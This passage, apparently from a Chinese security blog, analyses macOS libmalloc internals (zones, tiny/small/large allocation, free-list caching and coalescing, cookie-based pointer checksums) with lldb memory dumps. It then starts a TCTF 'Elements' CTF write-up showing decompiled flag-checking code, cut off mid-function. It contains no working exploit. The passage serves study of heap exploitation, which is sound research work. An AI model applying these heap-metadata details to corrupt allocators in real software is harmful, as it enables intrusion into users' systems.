DEFAULT_MALLOC_ZONE_STRING); initial_default_zone = zone; if (n != 0) { // make the default first, for efficiency unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *); malloc_zone_t *hold = malloc_zones[0]; if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) { malloc_set_zone_name(hold, NULL); } mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE); malloc_zones[0] = malloc_zones[n]; malloc_zones[n] = hold; mprotect(malloc_zones, protect_size, PROT_READ); } ... } 这里主要看create_scalable_zone函数，所以默认的zone实际上就是scalable zone malloc_zone_t * create_scalable_zone(size_t initial_size, unsigned debug_flags) { return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags); } szone_t * create_scalable_szone(size_t initial_size, unsigned debug_flags) { szone_t *szone; /* get memory for the zone. */ szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC); if (!szone) { return NULL; } ... // Query the number of configured processors. // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives // the same behavior as the original scalable malloc. MP gets per-CPU magazines // that scale (way) better. unsigned int max_mags = mag_max_magazines(); uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1; rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags); rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags); #if CONFIG_LARGE_CACHE // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%] szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10); /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */ int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;); if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) { szone-&gt;large_legacy_reset_mprotect = TRUE; } else { szone-&gt;large_legacy_reset_mprotect = FALSE; } #endif // Initialize the security token. szone-&gt;cookie = (uintptr_t)malloc_entropy[0]; szone-&gt;basic_zone.version = 10; szone-&gt;basic_zone.size = (void *)szone_size; szone-&gt;basic_zone.malloc = (void *)szone_malloc; szone-&gt;basic_zone.calloc = (void *)szone_calloc; szone-&gt;basic_zone.valloc = (void *)szone_valloc; szone-&gt;basic_zone.free = (void *)szone_free; szone-&gt;basic_zone.realloc = (void *)szone_realloc; szone-&gt;basic_zone.destroy = (void *)szone_destroy; szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc; szone-&gt;basic_zone.batch_free = (void *)szone_batch_free; szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect; szone-&gt;basic_zone.memalign = (void *)szone_memalign; szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size; szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief; szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved1 = 0; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved2 = 0; /* Prevent overwriting the function pointers in basic_zone. */ mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ); szone-&gt;debug_flags = debug_flags; _malloc_lock_init(&amp;szone-&gt;large_szone_lock); szone-&gt;cpu_id_key = -1UL; // Unused. CHECK(szone, __PRETTY_FUNCTION__); return szone; } 这个函数分配并且初始化了szone，设置了szone_malloc、szone_free等函数 所以后面在调用malloc和free的时候实际上调用的是szone_malloc、szone_free。szone_malloc的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的malloc_zone_*进行实际的内存分配工作。 下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致 * frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482 frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18 frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77 frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103 frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24 frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109 frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37 frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396 frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197 frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68 .... scalable zoneszone包含两个racks，分别是tiny和small rack rack 32位机器 64位机器 tiny &lt;= 496B &lt;= 1008B small &lt;= 128KB &lt;=128KB 大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。 有几个处理器，rack就有几个magazine 每个magazine有多个regions，tiny(1MB)、small(8MB) 每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region) 具体可以从后面结构体中看出来其包含关系。 malloc-&gt;szone_malloc-&gt;szone_malloc_should_clearMALLOC_NOINLINE void * szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested) { void *ptr; msize_t msize; if (size &lt;= SMALL_THRESHOLD) { // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit) // think tiny msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1); if (!msize) { msize = 1; } ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested); } else if (size &lt;= szone-&gt;large_threshold) { // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS) // think small msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1); if (!msize) { msize = 1; } ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested); } else { // large: all other allocations size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift; if (num_kernel_pages == 0) { /* Overflowed */ ptr = 0; } else { ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested); } } return ptr; } 上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例 tiny_malloc_should_clearvoid * tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested) { void *ptr; mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines; magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested); #if DEBUG_MALLOC if (DEPOT_MAGAZINE_INDEX == mag_index) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\\n&quot;); return (NULL); } if (!msize) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\\n&quot;); return (NULL); } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE ptr = tiny_mag_ptr-&gt;mag_last_free; if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) { // we have a winner tiny_mag_ptr-&gt;mag_last_free = NULL; tiny_mag_ptr-&gt;mag_last_free_msize = 0; tiny_mag_ptr-&gt;mag_last_free_rgn = NULL; SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\\n&quot;, ptr, msize); } #endif return ptr; } #endif /* CONFIG_TINY_CACHE */ while (1) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } } // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc(). // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section. // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation, // and retry-ing threads succeed in the code just above. if (!tiny_mag_ptr-&gt;alloc_underway) { void *fresh_region; // time to create a new region (do this outside the magazine lock) tiny_mag_ptr-&gt;alloc_underway = TRUE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); // DTrace USDT Probe MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE); if (!fresh_region) { // out of memory! tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); return NULL; } ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region); // we don&#39;t clear because this freshly allocated space is pristine tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return ptr; } else { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); yield(); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } } /* NOTREACHED */ } 这里的if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。 free-&gt;malloc_zone_free-&gt;szone_freevoid szone_free(szone_t *szone, void *ptr) { region_t tiny_region; region_t small_region; #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\\n&quot;, ptr); } #endif if (!ptr) { return; } /* * Try to free to a tiny region. */ if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\\n&quot;, ptr); return; } if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) { if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\\n&quot;, ptr); return; } free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0); return; } /* * Try to free to a small region. */ if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\\n&quot;, ptr); return; } if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) { if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\\n&quot;, ptr); return; } free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0); return; } /* check that it&#39;s a legal large allocation */ if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\\n&quot;, ptr); return; } free_large(szone, ptr); } 同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例 void free_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size) { msize_t msize; boolean_t is_free; mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region); magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size); // ptr is known to be in tiny_region if (known_size) { msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1); } else { msize = get_tiny_meta_header(ptr, &amp;is_free); if (is_free) { free_tiny_botch(rack, ptr); return; } } #if DEBUG_MALLOC if (!msize) { malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\\n&quot;, ptr); return; } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d if (DEPOT_MAGAZINE_INDEX != mag_index) { if (msize &lt; TINY_QUANTUM) { // to see if the bits fit in the last 4 bits void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize; region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn; /* check that we don&#39;t already have this pointer in the cache */ if (ptr == ptr2) { free_tiny_botch(rack, ptr); return; } if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) { memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize)); } tiny_mag_ptr-&gt;mag_last_free = ptr; tiny_mag_ptr-&gt;mag_last_free_msize = msize; tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region; if (!ptr2) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return; } msize = msize2; ptr = ptr2; tiny_region = rgn2; } } #endif /* CONFIG_TINY_CACHE */ // Now in the time it took to acquire the lock, the region may have migrated // from one magazine to another. I.e. trailer-&gt;mag_index is volatile. // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock) // is stale. If so, keep on tryin&#39; ... region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region); mag_index_t refreshed_index; while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); mag_index = refreshed_index; tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); } CHECK(szone, __PRETTY_FUNCTION__); } free的时候先将该内存缓存到mag_last_free，若之前mag_last_free为NULL，那么该内存暂时不会被free，仅仅是缓存到mag_last_free。反之，则会将mag_last_free之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点 最近free的内存会被缓存，不会立即合并 在被free的块metadata是被保护的 前后指针按16字节大小对齐 指针前4位为checksum 关于free块checksum计算如下： static MALLOC_INLINE uintptr_t free_list_checksum_ptr(rack_t *rack, void *ptr) { uintptr_t p = (uintptr_t)ptr; return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction } 指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。 实验代码如下 #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { void *p1,*p2,*p3,*p4; p1 = malloc(24); p2 = malloc(24); p3 = malloc(24); p4 = malloc(24); memset(p1,0xaa,24); memset(p2,0xbb,24); memset(p3,0xcc,24); free(p1); free(p3); free(p2); free(p4); } free(p1)，直接将p1缓存，所以内存值不变 (lldb) x/24gx p1 0x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa 0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节 (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1 (lldb) x/24gx p1 0x1002001f0: 0x3000000010020023 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x200000001002001f 0x100200240: 0xcccccccccccc0002 0x0002000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x5000000010020048 0x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x1000000010020108 0x100200240: 0xcccccccccccc0002 0x0006000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。 libmalloc中一些结构体szone_s // magazine_zone.htypedef struct szone_s { // vm_allocate()&#39;d, so page-aligned to begin with. malloc_zone_t basic_zone; // first page will be given read-only protection uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)]; unsigned long cpu_id_key; // unused // remainder of structure is R/W (contains no function pointers) unsigned debug_flags; void *log_address; /* Allocation racks per allocator type. */ struct rack_s tiny_rack; struct rack_s small_rack; /* large objects: all the rest */ _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large unsigned num_large_objects_in_use; unsigned num_large_entries; large_entry_t *large_entries; // hashed by location; null entries don&#39;t count size_t num_bytes_in_large_objects; #if CONFIG_LARGE_CACHE int large_entry_cache_oldest; int large_entry_cache_newest; large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free boolean_t large_legacy_reset_mprotect; size_t large_entry_cache_reserve_bytes; size_t large_entry_cache_reserve_limit; size_t large_entry_cache_bytes; // total size of death row, bytes #endif /* flag and limits pertaining to altered malloc behavior for systems with * large amounts of physical memory */ unsigned is_largemem; unsigned large_threshold; unsigned vm_copy_threshold; /* security cookie */ uintptr_t cookie; /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */ struct szone_s *helper_zone; boolean_t flotsam_enabled; } szone_t; malloc_zone_t // malloc.htypedef struct _malloc_zone_t { /* Only zone implementors should depend on the layout of this structure; Regular callers should use the access functions below */ void *reserved1; /* RESERVED FOR CFAllocator DO NOT USE */ void *reserved2; /* RESERVED FOR CFAllocator DO NOT USE */ size_t (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */ void *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size); void *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */ void *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */ void (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr); void *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size); void (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g const char *zone_name; /* Optional batch callbacks; these may be NULL */ unsigned (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */ void (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */ struct malloc_introspection_t * MALLOC_INTROSPECT_TBL_PTR(introspect); unsigned version; /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */ void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size); /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/ void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size); /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */ size_t (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal); /* * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10. * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has * not yet been allocated. False negatives are not allowed. */ boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr); } malloc_zone_t; rack_t // magazine_rack.htypedef struct rack_s { /* Regions for tiny objects */ _malloc_lock_s region_lock MALLOC_CACHE_ALIGN; rack_type_t type; size_t num_regions; size_t num_regions_dealloc; region_hash_generation_t *region_generation; region_hash_generation_t rg[2]; region_t initial_regions[INITIAL_NUM_REGIONS]; int num_magazines; unsigned num_magazines_mask; int num_magazines_mask_shift; uint32_t debug_flags; // array of per-processor magazines magazine_t *magazines; uintptr_t cookie; uintptr_t last_madvise; } rack_t; magazine_t // magazine_zone.htypedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with. // Take magazine_lock first, Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN; // Protection for the crtical section that does allocate_pages outside the magazine_lock volatile boolean_t alloc_underway; // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size. void *mag_last_free; msize_t mag_last_free_msize; // msize for mag_last_free #if MALLOC_TARGET_64BIT uint32_t _pad; #endif region_t mag_last_free_rgn; // holds the region for mag_last_free free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS]; uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS]; // the first and last free region in the last block are treated as big blocks in use that are not accounted for size_t mag_bytes_free_at_end; size_t mag_bytes_free_at_start; region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0 // bean counting ... size_t mag_num_bytes_in_objects; size_t num_bytes_in_magazine; unsigned mag_num_objects; // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria. // Doubly linked list for efficient extraction. unsigned recirculation_entries; region_trailer_t *firstNode; region_trailer_t *lastNode; #if MALLOC_TARGET_64BIT uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS - (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2]; #else uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS - MAGAZINE_FREELIST_BITMAP_WORDS]; #endif } magazine_t; tiny_region_t //magazine_zone.h/* * Layout of a tiny region */ typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t)) typedef struct tiny_header_inuse_pair { uint32_t header; uint32_t inuse; } tiny_header_inuse_pair_t; typedef struct region_trailer { struct region_trailer *prev; struct region_trailer *next; boolean_t recirc_suitable; volatile int pinned_to_depot; unsigned bytes_used; mag_index_t mag_index; } region_trailer_t; #define NUM_TINY_BLOCKS 64520 typedef struct tiny_region { tiny_block_t blocks[NUM_TINY_BLOCKS]; region_trailer_t trailer; // The interleaved bit arrays comprising the header and inuse bitfields. // The unused bits of each component in the last pair will be initialized to sentinel values. tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS]; uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE]; } * tiny_region_t; 参考 http://phrack.org/issues/63/5.html https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html &lt;&lt;the Mac Hacker’s Handbook&gt;&gt; 第8章Exploiting Heap Overflows https://opensource.apple.com/source/libmalloc/ 源代码 http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf","tags":[{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"}]},{"title":"TCTF-Elements","date":"2019-03-27T07:13:30.000Z","path":"2019/03/27/TCTF-Elements/TCTF-Elements/","text":"TCTF-Elements 这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。 Elements下面是main函数伪代码 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char v3; // bl const __int32_t **v4; // rax char *v5; // rcx size_t v6; // rcx signed __int64 result; // rax char *v8; // r12 signed __int64 v9; // r14 char v10; // bl signed __int64 v11; // rax const unsigned __int16 *v12; // rcx signed __int64 v13; // rdx __int64 v14; // rsi unsigned __int16 v15; // bx signed __int64 v16; // rsi __m128i v17; // xmm0 char *v18; // rax double v19; // xmm2_8 double v20; // xmm0_8 double v21; // xmm2_8 double v22; // xmm3_8 double v23; // [rsp+20h] [rbp-148h] double v24; // [rsp+28h] [rbp-140h] double v25; // [rsp+30h] [rbp-138h] char s[8]; // [rsp+40h] [rbp-128h] char v27; // [rsp+6Bh] [rbp-FDh] fgets(s, 256, stdin); v3 = s[0]; if ( s[0] ) { v4 = __ctype_tolower_loc(); v5 = &amp;s[1]; do { *(v5 - 1) = (*v4)[v3]; v3 = *v5++; } while ( v3 ); } v6 = strlen(s); result = 0LL; if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 ) { v27 = 0; v8 = strtok(&amp;s[5], &quot;-&quot;); v9 = 0LL; if ( v8 ) { while ( strlen(v8) == 12 ) { v10 = *v8; v11 = 0LL; if ( *v8 ) { v12 = *__ctype_b_loc(); v13 = 1LL; v11 = 0LL; do { v14 = v10; v15 = v12[v10]; if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 ) { v16 = v14 - 87; } else { if ( !(v15 &amp; 0x800) ) goto LABEL_31; v16 = v14 - 48; } v11 = v16 | 16 * v11; if ( v13 &gt; 11 ) break; v10 = v8[v13++]; } while ( v10 ); } if ( !v9 &amp;&amp; v11 != 62791383142154LL ) break; v17 = (__m128i)_mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0), (__m128d)xmmword_400BE0); *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64; v18 = strtok(0LL, &quot;-&quot;); v8 = v18; if ( v9 &gt; 2 || !v18 ) { if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 